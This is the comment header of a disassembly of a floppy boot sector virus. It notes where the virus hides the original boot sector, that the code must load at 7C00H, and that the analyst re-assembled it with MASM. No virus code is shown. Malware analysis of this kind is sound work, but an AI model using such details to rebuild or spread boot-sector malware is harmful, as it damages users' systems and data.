	; The virus consists of a boot sector only on a floppy disk.
	; The original boot sector is kept at track thirty-nine, head zero,
	; sector eight.

	; The disassembly has been tested by re-assembly using MASM 5.0
	; Note that this does not create an identical program, as the original
	; appears to have been assembled with A86

	; MASM would not assemble the instruction at offset 003CH (7C3CH)
	; This instruction is undefined on an 8088/8086, and illegal
	; on a 80286/80386.

	; The program requires an origin address of 7C00H for the first sector
	; to load and run as a boot sector

	; System variables are defined in either RAM or BOOT (or both)
	; depending on the segment used by the program
